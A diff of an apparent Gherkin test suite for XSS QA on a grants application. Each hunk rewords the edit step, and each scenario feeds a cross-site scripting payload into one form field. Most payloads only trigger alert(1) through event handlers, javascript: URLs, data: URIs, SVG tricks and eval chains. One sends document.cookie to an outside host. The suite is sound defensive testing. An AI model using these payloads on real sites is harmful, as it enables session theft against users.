       | <form onsubmit=alert(1)><input type=submit> | fieldAssistanceType__c |
@@ -9805,7 +9805,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                      | Field                  |
       | <body ontouchend=alert(1)> | fieldAssistanceType__c |
@@ -9830,7 +9830,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                       | Field                  |
       | <body ontouchmove=alert(1)> | fieldAssistanceType__c |
@@ -9855,7 +9855,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                        | Field                  |
       | <body ontouchstart=alert(1)> | fieldAssistanceType__c |
@@ -9880,7 +9880,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                   | Field                  |
       | <audio autoplay controls onvolumechange=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldAssistanceType__c |
@@ -9905,7 +9905,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                   | Field                  |
       | <body onwheel=alert(1)> | fieldAssistanceType__c |
@@ -9930,7 +9930,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                 | Field                  |
       | <noembed><img title="</noembed><img src onerror=alert(1)>"></noembed> | fieldAssistanceType__c |
@@ -9955,7 +9955,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                    | Field                  |
       | <noscript><img title="</noscript><img src onerror=alert(1)>"></noscript> | fieldAssistanceType__c |
@@ -9980,7 +9980,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                           | Field                  |
       | <style><img title="</style><img src onerror=alert(1)>"></style> | fieldAssistanceType__c |
@@ -10005,7 +10005,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                              | Field                  |
       | <script><img title="</script><img src onerror=alert(1)>"></script> | fieldAssistanceType__c |
@@ -10030,7 +10030,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                              | Field                  |
       | <iframe><img title="</iframe><img src onerror=alert(1)>"></iframe> | fieldAssistanceType__c |
@@ -10055,7 +10055,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                     | Field                  |
       | <xmp><img title="</xmp><img src onerror=alert(1)>"></xmp> | fieldAssistanceType__c |
@@ -10080,7 +10080,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                    | Field                  |
       | <textarea><img title="</textarea><img src onerror=alert(1)>"></textarea> | fieldAssistanceType__c |
@@ -10105,7 +10105,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                    | Field                  |
       | <noframes><img title="</noframes><img src onerror=alert(1)>"></noframes> | fieldAssistanceType__c |
@@ -10130,7 +10130,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                           | Field                  |
       | <title><img title="</title><img src onerror=alert(1)>"></title> | fieldAssistanceType__c |
@@ -10155,7 +10155,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                                                                                                                                                            | Field                  |
       | <input type="file" id="fileInput" /><script>const fileInput = document.getElementById('fileInput');const dataTransfer = new DataTransfer();const file = new File(['Hello world!'], 'hello.txt', {type: 'text/plain'});dataTransfer.items.add(file);fileInput.files = dataTransfer.files</script> | fieldAssistanceType__c |
@@ -10180,7 +10180,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                  | Field                  |
       | <script>onerror=alert;throw 1</script> | fieldAssistanceType__c |
@@ -10205,7 +10205,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                   | Field                  |
       | <script>{onerror=alert}throw 1</script> | fieldAssistanceType__c |
@@ -10230,7 +10230,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                  | Field                  |
       | <script>throw onerror=alert,1</script> | fieldAssistanceType__c |
@@ -10255,7 +10255,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                 | Field                  |
       | <script>throw onerror=eval,'=alert\x281\x29'</script> | fieldAssistanceType__c |
@@ -10280,7 +10280,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                | Field                  |
       | <script>throw onerror=eval,'alert\x281\x29'</script> | fieldAssistanceType__c |
@@ -10305,7 +10305,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                 | Field                  |
       | <script>{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:1,message:'alert\x281\x29'}</script> | fieldAssistanceType__c |
@@ -10330,7 +10330,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                        | Field                  |
       | <script>throw onerror=eval,e=new Error,e.message='alert\x281\x29',e</script> | fieldAssistanceType__c |
@@ -10355,7 +10355,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                     | Field                  |
       | <script>throw onerror=Uncaught=eval,e=new Error,e.message='/*'+location.hash,!!window.InstallTrigger?e:e.message</script> | fieldAssistanceType__c |
@@ -10380,7 +10380,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                             | Field                  |
       | <script>throw{},onerror=Uncaught=eval,h=location.hash,e={lineNumber:1,columnNumber:1,fileName:0,message:h[2]+h[1]+h},!!window.InstallTrigger?e:e.message</script> | fieldAssistanceType__c |
@@ -10405,7 +10405,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                                    | Field                  |
       | <script>throw/x/,onerror=Uncaught=eval,h=location.hash,e=Error,e.lineNumber=e.columnNumber=e.fileName=e.message=h[2]+h[1]+h,!!window.InstallTrigger?e:e.message</script> | fieldAssistanceType__c |
@@ -10430,7 +10430,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                  | Field                  |
       | <script>'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}</script> | fieldAssistanceType__c |
@@ -10455,7 +10455,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                     | Field                  |
       | <script>'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}</script> | fieldAssistanceType__c |
@@ -10480,7 +10480,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                 | Field                  |
       | <script>location='javascript:alert\x281\x29'</script> | fieldAssistanceType__c |
@@ -10505,7 +10505,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                          | Field                  |
       | <script>location=name</script> | fieldAssistanceType__c |
@@ -10530,7 +10530,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                     | Field                  |
       | <script>alert`1`</script> | fieldAssistanceType__c |
@@ -10555,7 +10555,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                               | Field                  |
       | <script>new Function`X${document.location.hash.substr`1`}`</script> | fieldAssistanceType__c |
@@ -10580,7 +10580,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                             | Field                  |
       | <script>Function`X${document.location.hash.substr`1`}```</script> | fieldAssistanceType__c |
@@ -10605,7 +10605,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                     | Field                  |
       | <video><source onerror=location=/\02.rs/+document.cookie> | fieldAssistanceType__c |
@@ -10630,7 +10630,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                | Field                  |
       | <svg onload=alert(1) | fieldAssistanceType__c |
@@ -10655,7 +10655,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                    | Field                  |
       | <svg onload=alert(1)<!-- | fieldAssistanceType__c |
@@ -10680,7 +10680,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                     | Field                  |
       | <script>throw[onerror]=[alert],1</script> | fieldAssistanceType__c |
@@ -10705,7 +10705,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                             | Field                  |
       | <script>var{a:onerror}={a:alert};throw 1</script> | fieldAssistanceType__c |
@@ -10730,7 +10730,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                              | Field                  |
       | <script>var{haha:onerror=alert}=0;throw 1</script> | fieldAssistanceType__c |
@@ -10755,7 +10755,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                         | Field                  |
       | <script>window.name='javascript:alert(1)';</script><svg onload=location=name> | fieldAssistanceType__c |
@@ -10780,7 +10780,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                       | Field                  |
       | <xss class=progress-bar-animated onanimationstart=alert(1)> | fieldAssistanceType__c |
@@ -10805,7 +10805,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                                                                   | Field                  |
       | <xss class="carousel slide" data-ride=carousel data-interval=100 ontransitionend=alert(1)><xss class=carousel-inner><xss class="carousel-item active"></xss><xss class=carousel-item></xss></xss></xss> | fieldAssistanceType__c |
@@ -10830,7 +10830,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                              | Field                  |
       | <iframe src="javascript:alert(1)"> | fieldAssistanceType__c |
@@ -10855,7 +10855,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                               | Field                  |
       | <object data="javascript:alert(1)"> | fieldAssistanceType__c |
@@ -10880,7 +10880,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                             | Field                  |
       | <embed src="javascript:alert(1)"> | fieldAssistanceType__c |
@@ -10905,7 +10905,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                 | Field                  |
       | <a href="javascript:alert(1)">XSS</a> | fieldAssistanceType__c |
@@ -10930,7 +10930,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                 | Field                  |
       | <a href="JaVaScript:alert(1)">XSS</a> | fieldAssistanceType__c |
@@ -10955,7 +10955,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                   | Field                  |
       | <a href=" 	javascript:alert(1)">XSS</a> | fieldAssistanceType__c |
@@ -10980,7 +10980,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                  | Field                  |
       | <a href="javas	cript:alert(1)">XSS</a> | fieldAssistanceType__c |
@@ -11005,7 +11005,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                 | Field                  |
       | <a href="javascript:alert(1)">XSS</a> | fieldAssistanceType__c |
@@ -11030,7 +11030,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                       | Field                  |
       | <svg><a xlink:href="javascript:alert(1)"><text x="20" y="20">XSS</text></a> | fieldAssistanceType__c |
@@ -11055,7 +11055,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                  | Field                  |
       | <svg><animate xlink:href=#xss attributeName=href values=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a> | fieldAssistanceType__c |
@@ -11080,7 +11080,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                     | Field                  |
       | <svg><animate xlink:href=#xss attributeName=href from=javascript:alert(1) to=1 /><a id=xss><text x=20 y=20>XSS</text></a> | fieldAssistanceType__c |
@@ -11105,7 +11105,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                 | Field                  |
       | <svg><set xlink:href=#xss attributeName=href from=? to=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a> | fieldAssistanceType__c |
@@ -11130,7 +11130,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                 | Field                  |
       | <script src="data:text/javascript,alert(1)"></script> | fieldAssistanceType__c |
@@ -11155,7 +11155,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                | Field                  |
       | <svg><script href="data:text/javascript,alert(1)" /> | fieldAssistanceType__c |
@@ -11180,7 +11180,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                                                                                                                             | Field                  |
       | <svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='100' height='100'><a xlink:href='javascript:alert(1)'><rect x='0' y='0' width='100' height='100' /></a></svg>#x"></use></svg> | fieldAssistanceType__c |
@@ -11205,7 +11205,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                    | Field                  |
       | <script>import('data:text/javascript,alert(1)')</script> | fieldAssistanceType__c |
@@ -11230,7 +11230,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                           | Field                  |
       | <base href="javascript:/a/-alert(1)///////"><a href=../lol/safari.html>test</a> | fieldAssistanceType__c |
@@ -11255,7 +11255,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                    | Field                  |
       | <math><x href="javascript:alert(1)">blah | fieldAssistanceType__c |
@@ -11280,7 +11280,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                            | Field                  |
       | <form><button formaction=javascript:alert(1)>XSS | fieldAssistanceType__c |
@@ -11305,7 +11305,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                              | Field                  |
       | <form><input type=submit formaction=javascript:alert(1) value=XSS> | fieldAssistanceType__c |
@@ -11330,7 +11330,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                          | Field                  |
       | <form action=javascript:alert(1)><input type=submit value=XSS> | fieldAssistanceType__c |
@@ -11355,7 +11355,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                                                                      | Field                  |
       | <svg><animate xlink:href=#xss attributeName=href dur=5s repeatCount=indefinite keytimes=0;0;1 values="https://portswigger.net?&semi;javascript:alert(1)&semi;0" /><a id=xss><text x=20 y=20>XSS</text></a> | fieldAssistanceType__c |
@@ -11380,7 +11380,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                      | Field                  |
       | <a href="javascript://%0aalert(1)">XSS</a> | fieldAssistanceType__c |
@@ -11405,7 +11405,7 @@ Business Need: Test suite: User Story 296453: QA only-Internal - XSS - For
     When I setup my app as "As a Grantor"
     And I navigate to "Planning" tab
     And I click toggle button to select "Internal Programs - Draft"
-    And I click on "Edit" icon in flex table for record number "1"
+    And I click on "Edit" icon in flex table for first draft record
     When I enter values into fields
       | Value                                                                                                                                                                                                                                                                          | Field                  |
       | <svg><use href="data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnPgo8aW1hZ2UgaHJlZj0iMSIgb25lcnJvcj0iYWxlcnQoMSkiIC8+Cjwvc3ZnPg==#x" /></svg> | fieldAssistanceType__c |
